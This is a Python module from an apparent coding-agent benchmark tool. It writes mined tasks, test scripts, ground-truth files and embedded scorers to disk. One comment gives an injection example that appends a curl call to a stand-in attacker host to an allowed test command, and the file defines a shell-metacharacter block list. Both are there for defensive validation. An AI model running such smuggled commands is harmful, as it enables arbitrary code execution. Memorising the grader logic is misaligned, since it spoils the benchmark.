"""Write mined tasks to the experiment directory structure."""

from __future__ import annotations

import datetime
import json
import logging
import re
import shlex
from dataclasses import asdict, replace
from pathlib import Path, PurePosixPath

from codeprobe.mining.extractor import _is_safe_relative_path
from codeprobe.models.task import Task

logger = logging.getLogger(__name__)


def write_suite_manifest(
    tasks_dir: Path,
    goal_name: str,
    task_types: tuple[str, ...],
    description: str,
) -> Path:
    """Write a suite.toml alongside the tasks directory.

    Derives the suite name from the goal name and current date::

        codeprobe-<goal-slug>-<YYYY-MM-DD>

    The emitted TOML is compatible with :func:`codeprobe.loaders.suite.load_suite`.

    Returns the path to the written suite.toml.
    """
    goal_slug = goal_name.lower().replace(" ", "-")
    date_str = datetime.date.today().isoformat()
    suite_name = f"codeprobe-{goal_slug}-{date_str}"

    # Format task_types as a TOML array
    types_items = ", ".join(f'"{t}"' for t in task_types)
    types_toml = f"[{types_items}]"

    # Escape for TOML basic strings (double-quoted)
    def _toml_escape(s: str) -> str:
        return (
            s.replace("\\", "\\\\")
            .replace('"', '\\"')
            .replace("\n", "\\n")
            .replace("\r", "\\r")
            .replace("\t", "\\t")
        )

    escaped_desc = _toml_escape(description)
    escaped_name = _toml_escape(suite_name)
    escaped_goal = _toml_escape(goal_name)

    content = (
        "[suite]\n"
        f'name = "{escaped_name}"\n'
        f'description = "{escaped_desc}"\n'
        f'task_dir = "tasks"\n'
        f'eval_goal = "{escaped_goal}"\n'
        f"task_types = {types_toml}\n"
    )

    suite_path = tasks_dir.parent / "suite.toml"
    suite_path.write_text(content, encoding="utf-8")

    logger.info("Wrote suite manifest → %s", suite_path)
    return suite_path


# Pattern for stripping backtick-wrapped code patterns from instructions
_BACKTICK_PATTERN = re.compile(r"`[^`]+`")
# Pattern for "containing matches for the patterns X, Y, Z" and similar phrases
_PATTERNS_PHRASE = re.compile(
    r"\s*(?:containing\s+matches\s+)?(?:matching|for)\s+the\s+patterns?\s+"
    r"(?:`[^`]+`(?:,\s*)?)+\.?",
    re.IGNORECASE,
)

_MAX_FALLBACK_LEN = 500
_MAX_ISSUE_BODY_LEN = 1500
_WHAT_THIS_PR_PATTERN = re.compile(
    r"^#+\s*what\s+this\s+pr\s+does[^\n]*", re.IGNORECASE | re.MULTILINE
)

# Common PR template section headers that contain noise or solution details.
# Each pattern matches the entire heading line (via [^\n]*) so no trailing
# fragments are left behind.
_PR_TEMPLATE_SECTIONS = re.compile(
    r"^#+\s*(?:"
    r"what\s+type\s+of\s+pr\s+is\s+this"
    r"|which\s+issue"
    r"|special\s+notes?\s+for"
    r"|does\s+this\s+pr\s+introduce"
    r"|additional\s+documentation"
    r"|release[\s-]*note"
    r"|checklist"
    r"|how\s+has\s+this\s+been\s+tested"
    r"|screenshots?"
    r"|related\s+(?:issues?|prs?|pull\s+requests?)"
    r"|testing\s+done"
    r")[^\n]*",
    re.IGNORECASE | re.MULTILINE,
)

# Lines that are just PR template labels (e.g., "/kind feature", "/area foo")
_PR_TEMPLATE_LABEL = re.compile(r"^/\w+\s+\S+", re.MULTILINE)

# HTML comments (including multiline ones like PR template instructions)
_HTML_COMMENT = re.compile(r"<!--.*?-->", re.DOTALL)

# Fenced code blocks with specific info strings that are noise (release notes, docs)
_NOISE_FENCED_BLOCKS = re.compile(r"```(?:release-note|docs)\b.*?```", re.DOTALL)

# <details> blocks (often contain verbose reproduction steps, version dumps)
_DETAILS_BLOCK = re.compile(r"<details>.*?</details>", re.DOTALL)

# MCP-advantaged families where the symbol name and definition file are
# essential task information and must NOT be stripped from instruction.md.
_MCP_CATEGORIES: frozenset[str] = frozenset(
    {
        "symbol-reference-trace",
        "type-hierarchy-consumers",
        "change-scope-audit",
    }
)

# ---------------------------------------------------------------------------
# Self-contained oracle scorer (vendored into each task's tests/oracle.py)
# No codeprobe install required — only stdlib imports.
# ---------------------------------------------------------------------------
_ORACLE_PY = '''\
#!/usr/bin/env python3
"""Self-contained F1 oracle scorer for org-scale tasks.

Usage: python3 oracle.py <task_dir>

Reads answer.txt and ground_truth.json from task_dir, computes F1,
writes reward.txt, and exits 0 on success (any score) or 1 on error.

Scoring:
- When ground_truth.json has an ``oracle_tiers`` map (schema v2), the
  primary score is weighted F1 using tier weights
  required=2.0 / supplementary=1.0 / context=0.5. Otherwise plain F1.
  Matches codeprobe.mining.org_scale_oracle._weighted_f1 and CSB's
  _get_primary_score behavior.
- Path matching is two-pass:
  1. exact normalized match (handles ``./``, ``/workspace/``, etc. prefixes)
  2. repo-prefix stripped match (handles ``kubernetes/pkg/foo.go`` and
     ``/home/user/kubernetes/pkg/foo.go`` against oracle ``pkg/foo.go``),
     requires ``repo`` field in ground_truth.json.
"""
import json, sys
from pathlib import Path

TIER_WEIGHTS = {"required": 2.0, "supplementary": 1.0, "context": 0.5}

def normalize(p):
    p = p.replace("\\\\", "/").strip()
    for pfx in ("./", "/workspace/", "/tmp/", "/app/"):
        while p.startswith(pfx):
            p = p[len(pfx):]
    return p.lstrip("/")

def strip_repo_prefix(p, repo):
    """Strip leading path up to and including ``/<repo>/`` when present.

    ``kubernetes/pkg/foo.go``                  -> ``pkg/foo.go``
    ``/home/user/kubernetes/pkg/foo.go``       -> ``pkg/foo.go``
    ``github.com/k/kubernetes/pkg/foo.go``     -> ``pkg/foo.go``

    Leaves ``p`` unchanged when ``repo`` is empty or the segment is
    absent. Safe to apply to already-normalized oracle paths: they
    typically don't contain the repo segment, so this is a no-op on them.
    """
    if not repo:
        return p
    seg = "/" + repo + "/"
    # Match both ``a/b/<repo>/rest`` and bare ``<repo>/rest`` leading form.
    idx = p.rfind(seg)
    if idx >= 0:
        return p[idx + len(seg):]
    if p.startswith(repo + "/"):
        return p[len(repo) + 1:]
    return p

def main():
    task_dir = Path(sys.argv[1])
    gt = json.loads((task_dir / "ground_truth.json").read_text())
    repo = gt.get("repo", "") or ""
    tiers_raw = gt.get("oracle_tiers") or {}
    has_tiers = bool(tiers_raw)

    expected_set = frozenset(
        strip_repo_prefix(normalize(p), repo)
        for p in gt.get("expected", [])
        if p
    )
    if not expected_set:
        print("FAIL: empty ground truth")
        sys.exit(1)

    # Tier map keyed by the same normalized+stripped form as expected_set.
    tier_map = {
        strip_repo_prefix(normalize(k), repo): v
        for k, v in tiers_raw.items()
    }

    answer_file = task_dir / "answer.txt"
    if not answer_file.exists():
        print("FAIL: no answer.txt")
        (task_dir / "reward.txt").write_text("0.0\\n")
        sys.exit(0)

    lines = answer_file.read_text().splitlines()
    agent_set = frozenset(
        strip_repo_prefix(normalize(l), repo)
        for l in lines
        if l.strip() and not l.startswith("#")
    )
    if not agent_set:
        print("FAIL: empty answer")
        (task_dir / "reward.txt").write_text("0.0\\n")
        sys.exit(0)

    matched = expected_set & agent_set
    intersection = len(matched)
    precision = intersection / len(agent_set)
    recall = intersection / len(expected_set)
    f1 = 2 * precision * recall / (precision + recall) if (precision + recall) > 0 else 0.0

    if has_tiers:
        total_w = sum(TIER_WEIGHTS.get(t, 1.0) for t in tier_map.values()) or 1.0
        matched_w = sum(
            TIER_WEIGHTS.get(tier_map.get(p, "required"), 2.0) for p in matched
        )
        weighted_recall = matched_w / total_w
        denom = precision + weighted_recall
        weighted_f1 = 2 * precision * weighted_recall / denom if denom > 0 else 0.0
        primary, metric = weighted_f1, "weighted_f1"
    else:
        primary, metric = f1, "f1"
        weighted_recall = None

    (task_dir / "reward.txt").write_text(f"{primary:.4f}\\n")
    msg = (
        f"score={primary:.4f} metric={metric} f1={f1:.4f} "
        f"precision={precision:.4f} recall={recall:.4f} "
        f"matched={intersection}/{len(expected_set)} agent_files={len(agent_set)}"
    )
    if has_tiers:
        msg += f" weighted_recall={weighted_recall:.4f}"
    print(msg)

if __name__ == "__main__":
    main()
'''


def _strip_pr_template(text: str) -> str:
    """Remove common PR template sections and label lines from text.

    Preserves content that precedes any template section and the
    "What this PR does / why we need it" section body (the actual
    problem description), while stripping the heading itself.
    """
    # Normalise Windows line endings for consistent splitting
    text = text.replace("\r\n", "\n").replace("\r", "\n")

    # Strip HTML comments (PR template instructions like <!-- Tips for you... -->)
    text = _HTML_COMMENT.sub("", text)

    # Strip noise fenced blocks (```release-note ... ```, ```docs ... ```)
    text = _NOISE_FENCED_BLOCKS.sub("", text)

    # Extract "What this PR does" section content — this is the useful part
    what_match = _WHAT_THIS_PR_PATTERN.search(text)
    what_body = ""
    if what_match:
        # Find the content between this heading and the next heading
        after = text[what_match.end() :]
        next_heading = re.search(r"^#+\s", after, re.MULTILINE)
        section = after[: next_heading.start()] if next_heading else after
        what_body = section.strip()

    # Remove all template sections (including "What this PR does" heading)
    cleaned = _PR_TEMPLATE_SECTIONS.sub("", text)
    cleaned = _WHAT_THIS_PR_PATTERN.sub("", cleaned)

    # Remove label lines ("/kind feature", "/area scheduling")
    cleaned = _PR_TEMPLATE_LABEL.sub("", cleaned)

    # Collapse runs of blank lines
    cleaned = re.sub(r"\n{3,}", "\n\n", cleaned).strip()

    # If we extracted a "What this PR does" body, prepend it if it's not
    # already present (it got removed with its heading)
    if what_body and what_body not in cleaned:
        cleaned = what_body + ("\n\n" + cleaned if cleaned else "")

    return cleaned


def _extract_first_paragraph(description: str) -> str:
    """Extract the meaningful first paragraph from a PR description.

    Strips the title line (first line), removes common PR template sections
    (kubernetes-style "What type of PR is this?", etc.), and returns the
    first non-empty paragraph, truncated to 500 chars.
    """
    lines = description.strip().splitlines()
    # Skip the title (first line) — it's already used as the heading
    body_lines = lines[1:] if len(lines) > 1 else lines
    text = "\n".join(body_lines).strip()

    # Strip PR template boilerplate
    text = _strip_pr_template(text)

    # Take only up to the first blank line (first paragraph)
    paragraphs = text.split("\n\n")
    first = ""
    for p in paragraphs:
        candidate = p.strip()
        if candidate:
            first = candidate
            break

    if len(first) > _MAX_FALLBACK_LEN:
        first = first[:_MAX_FALLBACK_LEN] + "..."
    return first


_ALLOWED_COMMAND_PREFIXES = (
    "bash tests/test.sh",
    "bash -c ",
    "pytest ",
    "go test ",
    "npm test ",
    "codeprobe oracle-check ",
)

# Characters that change shell control flow — any appearance blocks a
# command from the allowlist even if the prefix matches, because a
# crafted input like ``pytest tests; curl attacker.com`` passes the
# prefix test and then executes arbitrary shell.
_SHELL_METACHARACTERS = (";", "|", "&", "`", "$", "<", ">", "\n")


def _validate_verification_command(cmd: str) -> None:
    """Reject a verification command that doesn't match the strict allowlist.

    Two conditions must hold:
    1. The command must start with one of the known-safe prefixes.
    2. The command must NOT contain any shell metacharacter. The earlier
       prefix-only check was trivially bypassable by appending ``; curl …``
       or similar payloads to an allowed prefix.
    """
    if not any(
        cmd == prefix or cmd.startswith(prefix) for prefix in _ALLOWED_COMMAND_PREFIXES
    ):
        raise ValueError(f"Verification command not in allowlist: {cmd!r}")
    for ch in _SHELL_METACHARACTERS:
        if ch in cmd:
            raise ValueError(
                f"Shell metacharacter {ch!r} not allowed in verification command: "
                f"{cmd!r}"
            )


def _build_test_script(cmd: str, repo_path: Path, *, header: str) -> str:
    """Build a test.sh that cd's into ``TASK_REPO_ROOT`` with a mined fallback.

    The executor sets ``TASK_REPO_ROOT`` to the per-run worktree (when one
    is owned) so parallel dual runs cannot trample shared workspace state.
    Legacy runs without the env var fall back to the mined ``repo_path``.
    """
    _validate_verification_command(cmd)
    fallback = shlex.quote(str(repo_path))
    return (
        "#!/usr/bin/env bash\n"
        "set -euo pipefail\n\n"
        f"# {header}\n"
        f"_CODEPROBE_REPO_DEFAULT={fallback}\n"
        'cd "${TASK_REPO_ROOT:-$_CODEPROBE_REPO_DEFAULT}"\n'
        f"{cmd}\n"
    )


# Weighted-checklist schema version emitted in validation_result.json.
_WEIGHTED_CHECKLIST_SCHEMA = "weighted_checklist.v1"

_WEIGHTS = {
    "correct_files": 0.30,
    "syntax_valid": 0.25,
    "scope_respected": 0.25,
    "test_passed": 0.20,
}

# Vendored Python helper for the weighted-checklist verifier — shipped
# as an f-string-free module-level constant so future edits don't fight
# brace-escape rules. Reads its inputs from env vars (CP_*) and writes
# reward.txt + validation_result.json into the sandbox dir. The final
# stdout line is `composite_score=<float>` for ContinuousScorer's
# stdout fallback path in codeprobe.core.scoring.
_WEIGHTED_CHECKLIST_PY = '''\
import json
import os
import py_compile
from pathlib import Path


def _normalize(p):
    p = p.replace("\\\\", "/").strip()
    for pfx in ("./", "/workspace/", "/tmp/", "/app/"):
        while p.startswith(pfx):
            p = p[len(pfx):]
    return p.lstrip("/")


gt = json.loads(os.environ["CP_GROUND_TRUTH"])
source_files = [_normalize(f) for f in gt.get("source_files", [])]
scope_dirs = gt.get("scope_dirs", [])
language = gt.get("language", "")
weights = gt["weights"]

changed_set = {
    _normalize(line)
    for line in os.environ.get("CP_CHANGED_FILES", "").splitlines()
    if line.strip()
}
test_exit = int(os.environ.get("CP_TEST_EXIT", "1"))

checks = []

if source_files:
    matched = sum(1 for f in source_files if f in changed_set)
    score = matched / len(source_files)
    detail = f"{matched}/{len(source_files)} expected source files modified"
else:
    score = 0.0
    detail = "no expected source files in ground truth"
checks.append(
    {
        "name": "correct_files",
        "weight": weights["correct_files"],
        "score": score,
        "detail": detail,
    }
)

syntax_score = 1.0
syntax_detail = f"syntax check skipped for language={language!r} (full credit)"
if language in ("python", "py"):
    ok = total = 0
    for f in source_files:
        if not f.endswith(".py") or not Path(f).is_file():
            continue
        total += 1
        try:
            py_compile.compile(f, doraise=True)
            ok += 1
        except (py_compile.PyCompileError, SyntaxError, OSError):
            pass
    if total > 0:
        syntax_score = ok / total
        syntax_detail = f"{ok}/{total} files parse"
    else:
        syntax_detail = "no python files to parse (full credit)"
checks.append(
    {
        "name": "syntax_valid",
        "weight": weights["syntax_valid"],
        "score": syntax_score,
        "detail": syntax_detail,
    }
)

scope_score = 1.0
scope_detail = "no scope constraints (full credit)"
if scope_dirs and changed_set:
    out_of_scope = [
        f for f in changed_set
        if not any(f == d or f.startswith(d + "/") for d in scope_dirs)
    ]
    if out_of_scope:
        in_scope_count = len(changed_set) - len(out_of_scope)
        scope_score = in_scope_count / len(changed_set)
        scope_detail = (
            f"{len(out_of_scope)}/{len(changed_set)} file(s) outside {scope_dirs}"
        )
    else:
        scope_detail = f"all changes within {scope_dirs}"
checks.append(
    {
        "name": "scope_respected",
        "weight": weights["scope_respected"],
        "score": scope_score,
        "detail": scope_detail,
    }
)

checks.append(
    {
        "name": "test_passed",
        "weight": weights["test_passed"],
        "score": 1.0 if test_exit == 0 else 0.0,
        "detail": f"verification command exit={test_exit}",
    }
)

composite = sum(c["score"] * c["weight"] for c in checks)
composite = max(0.0, min(1.0, composite))

for c in checks:
    if c["score"] >= 1.0:
        marker = "x"
    elif c["score"] > 0.0:
        marker = "~"
    else:
        marker = " "
    print(
        f"[{marker}] {c['name']} ({c['weight']:.2f}): "
        f"score={c['score']:.2f} - {c['detail']}"
    )

sandbox_dir = os.environ.get("CP_SANDBOX_DIR", "")
if sandbox_dir:
    sandbox_path = Path(sandbox_dir)
    try:
        (sandbox_path / "reward.txt").write_text(
            f"{composite:.4f}\\n", encoding="utf-8"
        )
        (sandbox_path / "validation_result.json").write_text(
            json.dumps(
                {
                    "schema_version": gt.get(
                        "schema_version", "weighted_checklist.v1"
                    ),
                    "composite_score": composite,
                    "sub_scores": {c["name"]: c for c in checks},
                },
                indent=2,
            ),
            encoding="utf-8",
        )
    except OSError:
        pass

print(f"composite_score={composite:.4f}")
'''


def _build_weighted_checklist_script(
    cmd: str,
    repo_path: Path,
    *,
    language: str,
    ground_truth: dict,
    header: str,
) -> str:
    """Build a weighted-checklist test.sh that emits a float score in [0, 1].

    The generated script runs four weighted sub-checks against the agent's
    changes in ``TASK_REPO_ROOT`` (falling back to the mined ``repo_path``):

    - ``correct_files`` (0.30): fraction of expected source files that the
      agent actually modified
    - ``syntax_valid`` (0.25): expected source files parse without syntax
      errors (language-aware; unknown languages receive full credit)
    - ``scope_respected`` (0.25): fraction of changed files that live
      inside the set of scope directories derived from the expected
      source files (proportional — an out-of-scope file only costs its
      share, not the whole check; empty scope or no changes falls
      through to full credit)
    - ``test_passed`` (0.20): the mined verification command (``cmd``)
      exits zero

    Composite is printed as ``composite_score=<float>`` (last stdout line
    consumed by :class:`codeprobe.core.scoring.ContinuousScorer`) and also
    written to ``reward.txt`` in the sandbox task dir, with a full
    sub-score breakdown in ``validation_result.json``.
    """
    _validate_verification_command(cmd)

    # Filter source_files through the mining safety predicate so a malformed
    # ground_truth cannot smuggle ``../etc/passwd`` into reward artifacts.
    raw_sources = list(ground_truth.get("source_files") or [])
    source_files = [f for f in raw_sources if _is_safe_relative_path(f)]

    # Prefer explicit writable_paths (mined per codeprobe-br7.5 from all
    # changed files, so tests/ is included). Fall back to the historical
    # source_files-parent derivation for ground_truth written before
    # writable_paths was added. Re-filter at this boundary for defense in
    # depth even though the miner already validates, and normalize through
    # PurePosixPath so stray './' prefixes don't desync with the embedded
    # Python's _normalize() on the agent side.
    raw_writable = ground_truth.get("writable_paths")
    if raw_writable is not None:
        normalized: set[str] = set()
        for p in raw_writable:
            if not _is_safe_relative_path(p):
                continue
            norm = str(PurePosixPath(p))
            if norm == ".":
                continue
            normalized.add(norm)
        scope_dirs = sorted(normalized)
    else:
        scope_dirs = sorted(
            {
                str(Path(f).parent)
                for f in source_files
                if str(Path(f).parent) != "."
            }
        )

    # JSON is safe inside single-quoted bash strings: json.dumps produces
    # no single quotes and no backslash escapes when ensure_ascii=True.
    gt_payload = json.dumps(
        {
            "source_files": source_files,
            "scope_dirs": scope_dirs,
            "language": (language or "").lower(),
            "weights": _WEIGHTS,
            "schema_version": _WEIGHTED_CHECKLIST_SCHEMA,
        },
        ensure_ascii=True,
    )

    fallback = shlex.quote(str(repo_path))
    # pipefail intentionally off so a failing verification command inside
    # a subshell doesn't abort before the composite score is computed.
    return f"""#!/usr/bin/env bash
set -u

# {header}
_CODEPROBE_REPO_DEFAULT={fallback}
_CP_SANDBOX_DIR="$(cd "$(dirname "$0")/.." && pwd)"
cd "${{TASK_REPO_ROOT:-$_CODEPROBE_REPO_DEFAULT}}"

git config --global --add safe.directory "$(pwd)" 2>/dev/null || true

_CP_ORIGIN_REF=""
for ref in origin/main origin/master origin/HEAD; do
    if git rev-parse "$ref" >/dev/null 2>&1; then
        _CP_ORIGIN_REF="$ref"
        break
    fi
done

# Collect changed files: committed-vs-origin is a separate query from the
# porcelain which covers unstaged, staged, and untracked in one fork.
CP_CHANGED_FILES="$(
    {{
        if [ -n "$_CP_ORIGIN_REF" ]; then
            git diff --name-only "$_CP_ORIGIN_REF..HEAD" 2>/dev/null || true
        fi
        git status --porcelain 2>/dev/null | awk '{{print $NF}}' || true
    }} | sort -u | grep -v '^$' || true
)"

{cmd}
CP_TEST_EXIT=$?

export CP_CHANGED_FILES
export CP_TEST_EXIT
export CP_SANDBOX_DIR="$_CP_SANDBOX_DIR"
export CP_GROUND_TRUTH={shlex.quote(gt_payload)}

python3 - <<'PYEOF'
{_WEIGHTED_CHECKLIST_PY}
PYEOF
"""


def write_task_dir(
    task: Task,
    base_dir: Path,
    repo_path: Path,
    *,
    curation_backends: tuple[str, ...] = (),
    ground_truth: dict | None = None,
) -> Path:
    """Write a mined task to the experiment directory structure.

    Creates::

        base_dir/task.id/
            instruction.md
            tests/test.sh
            metadata.json

    Returns the task directory path.

    Raises ValueError if task.id contains path separators or is empty.

    When *curation_backends* is provided, the ground_truth.json curation
    provenance block records the backend names that contributed to the
    curated file set.
    """
    # Validate task.id is safe for filesystem use (no path traversal)
    safe_id = Path(task.id).name
    if not safe_id or safe_id != task.id:
        raise ValueError(f"Invalid task id for filesystem use: {task.id!r}")

    task_dir = base_dir / safe_id
    tests_dir = task_dir / "tests"
    tests_dir.mkdir(parents=True, exist_ok=True)

    # Write instruction.md and verification files
    repo_name = repo_path.name
    language = task.metadata.language or "unknown"

    # Oracle tasks get a different output structure
    if task.verification.type == "oracle":
        _write_oracle_task(
            task,
            task_dir,
            tests_dir,
            repo_path,
            safe_id,
            curation_backends=curation_backends,
        )
        return task_dir

    # Dual-verification tasks: direct test.sh + artifact answer.json
    if task.verification.verification_mode == "dual":
        _write_dual_task(task, task_dir, tests_dir, repo_path, safe_id)
        return task_dir

    if task.metadata.issue_title:
        issue_body = task.metadata.issue_body

        # Only apply regex cleanup for non-LLM content — LLM output is clean
        if task.metadata.enrichment_source != "llm":
            # Strip solution-leaking sections from issue body
            pr_match = _WHAT_THIS_PR_PATTERN.search(issue_body)
            if pr_match:
                issue_body = issue_body[: pr_match.start()].strip()
            # Strip HTML comments, <details> blocks, and noise fenced blocks
            issue_body = _HTML_COMMENT.sub("", issue_body)
            issue_body = _DETAILS_BLOCK.sub("", issue_body)
            issue_body = _NOISE_FENCED_BLOCKS.sub("", issue_body)
            # Collapse blank lines and truncate to keep instructions focused
            issue_body = re.sub(r"\n{3,}", "\n\n", issue_body).strip()
            if len(issue_body) > _MAX_ISSUE_BODY_LEN:
                issue_body = issue_body[:_MAX_ISSUE_BODY_LEN] + "\n\n[...truncated]"
        instruction = (
            f"# {task.metadata.issue_title}\n\n"
            f"**Repository:** {repo_name}\n"
            f"**Language:** {language}\n\n"
            "## Problem\n\n"
            f"{issue_body}\n\n"
            "## Task Contract\n\n"
            f"- `TASK_REPO_ROOT={repo_path}`\n\n"
            "## Task\n\n"
            "Implement the fix or feature described above. "
            "The test script will verify correctness.\n"
        )
    else:
        # Fallback: use PR title + first paragraph only (not full body)
        pr_hint = _extract_first_paragraph(task.metadata.description)
        instruction = (
            f"# {task.metadata.name}\n\n"
            f"**Repository:** {repo_name}\n"
            f"**Language:** {language}\n\n"
            "## Task\n\n"
            f"{pr_hint}\n\n"
            "## Task Contract\n\n"
            f"- `TASK_REPO_ROOT={repo_path}`\n\n"
            "Implement the changes described above. "
            "The test script will verify correctness.\n"
        )
    instruction_path = task_dir / "instruction.md"
    instruction_path.write_text(instruction, encoding="utf-8")

    # Write instruction_mcp.md variant for MCP tasks
    if task.metadata.task_type == "mcp_tool_usage":
        _write_mcp_instruction_variant(task, task_dir, instruction)

    # Write tests/test.sh — weighted checklist for sdlc-schema ground truth,
    # otherwise a plain wrapper. Both paths validate the mined command against
    # the allowlist in _build_*_script.
    use_weighted = ground_truth is not None and str(
        ground_truth.get("schema_version", "")
    ).startswith("sdlc-")

    if use_weighted:
        test_script = _build_weighted_checklist_script(
            task.verification.command,
            repo_path,
            language=language,
            ground_truth=ground_truth,
            header=f"Weighted-checklist verification for task {safe_id}",
        )
        # Composite is a float in [0, 1] → downstream must use ContinuousScorer.
        task = replace(
            task,
            verification=replace(task.verification, reward_type="continuous"),
        )
    else:
        test_script = _build_test_script(
            task.verification.command,
            repo_path,
            header=f"Verification script for task {safe_id}",
        )
    test_sh_path = tests_dir / "test.sh"
    test_sh_path.write_text(test_script, encoding="utf-8")
    test_sh_path.chmod(0o755)

    # Write metadata.json
    metadata_path = task_dir / "metadata.json"
    metadata_path.write_text(
        json.dumps(asdict(task), indent=2, ensure_ascii=False) + "\n",
        encoding="utf-8",
    )

    # Write tests/ground_truth.json for SDLC tasks (when provided)
    if ground_truth is not None:
        gt_path = tests_dir / "ground_truth.json"
        gt_path.write_text(
            json.dumps(ground_truth, indent=2, ensure_ascii=False) + "\n",
            encoding="utf-8",
        )

    logger.info("Wrote task %s → %s", task.id, task_dir)
    return task_dir


# ---------------------------------------------------------------------------
# Dual-verification task layout (direct test.sh + artifact answer.json)
# ---------------------------------------------------------------------------

_DUAL_ANSWER_SCHEMA_SECTION = """\
## Expected answer.json

In addition to making code changes, you must write an `answer.json` file in
the repository root. This file captures the artifact the evaluator scores
against the oracle in `tests/ground_truth.json`.

`answer.json` must be valid JSON with the following required fields:

- `answer_type` (string): one of `file_list`, `count`, `boolean`, or `text`.
  This must match the `answer_type` in `tests/ground_truth.json`.
- `answer`: the payload. A list of file paths for `file_list`, an integer
  for `count`, a boolean for `boolean`, or a string for `text`.
- `reasoning` (string, optional): a brief explanation of how you arrived at
  the answer.

Example (`file_list`):

```json
{
  "answer_type": "file_list",
  "answer": ["src/foo.py", "src/bar.py"],
  "reasoning": "These files implement the auth refresh logic."
}
```

## Dual Scoring

This task uses **dual verification**. BOTH of the following will be
evaluated and combined into your final score:

1. **Direct verification** — `tests/test.sh` runs against your code
   changes and must pass.
2. **Artifact evaluation** — your `answer.json` will be compared against
   `tests/ground_truth.json`.

You must make the code changes AND write `answer.json`. Skipping either
will lower your score.
"""


def _build_dual_instruction(
    task: Task,
    repo_name: str,
    language: str,
    repo_path: Path,
) -> str:
    """Build the combined dual-verification instruction.md content.

    Uses a single combined prompt (not two separate sections) that
    describes both the task and the answer.json schema + dual scoring
    behavior.
    """
    if task.metadata.issue_title:
        title = task.metadata.issue_title
        body = task.metadata.issue_body

        # Strip solution-leaking sections for non-LLM content
        if task.metadata.enrichment_source != "llm":
            pr_match = _WHAT_THIS_PR_PATTERN.search(body)
            if pr_match:
                body = body[: pr_match.start()].strip()
            body = _HTML_COMMENT.sub("", body)
            body = _DETAILS_BLOCK.sub("", body)
            body = _NOISE_FENCED_BLOCKS.sub("", body)
            body = re.sub(r"\n{3,}", "\n\n", body).strip()
            if len(body) > _MAX_ISSUE_BODY_LEN:
                body = body[:_MAX_ISSUE_BODY_LEN] + "\n\n[...truncated]"
        problem_section = f"## Problem\n\n{body}\n\n"
    else:
        title = task.metadata.name
        pr_hint = _extract_first_paragraph(task.metadata.description)
        problem_section = f"## Problem\n\n{pr_hint}\n\n"

    return (
        f"# {title}\n\n"
        f"**Repository:** {repo_name}\n"
        f"**Language:** {language}\n"
        f"**Verification Mode:** dual (direct + artifact)\n\n"
        f"{problem_section}"
        "## Task\n\n"
        "Implement the fix or feature described above.\n\n"
        f"{_DUAL_ANSWER_SCHEMA_SECTION}\n"
        "## Task Contract\n\n"
        f"- `TASK_REPO_ROOT={repo_path}`\n"
    )


def _write_dual_task(
    task: Task,
    task_dir: Path,
    tests_dir: Path,
    repo_path: Path,
    safe_id: str,
) -> None:
    """Write a dual-verification task layout.

    Produces::

        task_dir/
            instruction.md       (combined direct + artifact prompt)
            tests/test.sh        (direct verification script)
            tests/ground_truth.json  (artifact oracle — stub until mining populates)
            metadata.json
    """
    repo_name = repo_path.name
    language = task.metadata.language or "unknown"

    # instruction.md — single combined prompt with answer.json schema section
    instruction = _build_dual_instruction(task, repo_name, language, repo_path)
    (task_dir / "instruction.md").write_text(instruction, encoding="utf-8")

    # tests/test.sh — direct verification, validated against allowlist
    test_script = _build_test_script(
        task.verification.command,
        repo_path,
        header=f"Direct verification for dual task {safe_id}",
    )
    test_sh_path = tests_dir / "test.sh"
    test_sh_path.write_text(test_script, encoding="utf-8")
    test_sh_path.chmod(0o755)

    # tests/ground_truth.json — use oracle data from verification if populated,
    # otherwise write a stub for manual curation.
    has_oracle = bool(task.verification.oracle_answer)
    ground_truth: dict[str, object] = {
        "schema_version": 1,
        "answer_type": task.verification.oracle_type or "file_list",
        "answer": list(task.verification.oracle_answer) if has_oracle else [],
        "oracle_metadata": {
            "populated_by": "mining-phase-2" if has_oracle else "stub",
            "task_id": task.id,
        },
    }
    (tests_dir / "ground_truth.json").write_text(
        json.dumps(ground_truth, indent=2, ensure_ascii=False) + "\n",
        encoding="utf-8",
    )

    # metadata.json — full task dump (verification_mode flows through asdict)
    (task_dir / "metadata.json").write_text(
        json.dumps(asdict(task), indent=2, ensure_ascii=False) + "\n",
        encoding="utf-8",
    )

    logger.info("Wrote dual task %s → %s", task.id, task_dir)


# ---------------------------------------------------------------------------
# MCP instruction variant
# ---------------------------------------------------------------------------

_MCP_TOOLS_SECTION = """\
## Available MCP Tools

You have access to the following MCP tools for code navigation and comprehension:

| Tool | Description |
|------|-------------|
| `keyword_search` | Search for keywords or patterns across the repository |
| `read_file` | Read the contents of a specific file |
| `find_references` | Find all references to a symbol across the codebase |
| `go_to_definition` | Navigate to the definition of a symbol |
| `list_files` | List files in a directory or matching a pattern |
| `nls_search` | Natural language search across the codebase |

Use these tools to navigate the codebase, understand dependencies, and locate
the files that need changes. Start by searching for relevant symbols and
reading the key files before making modifications.
"""


def _write_mcp_instruction_variant(
    task: Task,
    task_dir: Path,
    base_instruction: str,
) -> None:
    """Write instruction_mcp.md alongside instruction.md for MCP tasks.

    Appends MCP tool references to the base instruction so agents with
    MCP access know which tools are available for code navigation.
    """
    mcp_suite = task.metadata.mcp_suite or "sourcegraph"
    mcp_instruction = (
        base_instruction.rstrip()
        + "\n\n"
        + _MCP_TOOLS_SECTION
        + f"\n**MCP Suite:** {mcp_suite}\n"
    )
    mcp_path = task_dir / "instruction_mcp.md"
    mcp_path.write_text(mcp_instruction, encoding="utf-8")
    logger.info("Wrote MCP instruction variant → %s", mcp_path)


def _get_family_description(category: str) -> str:
    """Look up the human-readable description for a task family by name."""
    try:
        from codeprobe.mining.org_scale_families import FAMILIES

        for family in FAMILIES:
            if family.name == category:
                return family.description
    except ImportError:
        pass
    return ""


def _strip_location_hints(question: str, family_description: str = "") -> str:
    r"""Remove grep-pattern hints from a question to create a discovery variant.

    Strips backtick-wrapped patterns (e.g. ``\`@Deprecated\```) and
    "matching the patterns ..." phrases so the agent must find the relevant
    code without being told which regex to use.

    When *family_description* is provided, uses it as the replacement clause
    (e.g. "containing deprecated API annotations or markers") so the discovery
    variant still communicates what to look for, just not the exact regex.
    """
    if family_description:
        # Strip leading "Find files" variants since the question already has
        # "find all files" — we only need the qualifying clause
        desc = re.sub(
            r"^find\s+(?:files|all\s+files)\s+",
            "",
            family_description,
            flags=re.IGNORECASE,
        )
        # Lowercase first char for mid-sentence insertion
        desc = desc[0].lower() + desc[1:] if desc else desc
        # Strip trailing period — we add our own
        desc = desc.rstrip(".")
        replacement = f" that {desc}." if desc else " that are relevant to this task."
    else:
        replacement = " that are relevant to this task."
